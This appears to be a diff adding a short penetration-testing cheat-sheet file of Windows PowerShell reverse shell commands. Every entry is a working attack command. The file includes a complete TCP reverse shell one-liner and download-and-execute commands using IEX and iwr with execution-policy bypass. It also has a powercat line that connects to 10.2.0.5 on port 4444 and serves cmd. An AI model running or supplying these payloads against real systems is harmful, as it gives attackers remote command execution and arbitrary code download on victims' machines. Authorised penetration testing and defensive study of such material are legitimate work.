@@ -1,0 +1,18 @@
+% reverse shell, Windows
+
+# Powershell download string reverse shell
+powershell "IEX(New-Object Net.WebClient).downloadString('<URL>')"
+
+# Powershell SMB reverse shell
+powershell -exec bypass -f <SMB_PATH_TO_PS1_REV_SHELL>
+
+# Powershell one liner reverse shell
+$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+# Powershell iwr reverse shell
+powershell -exec bypass -c "iwr('<URL>')|iex"
+
+# Powercat reverse shell
+ powershell -exec bypass -c "iwr('<URL_PATH_TO_POWERCAT_PS1>')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
+ 
+ 
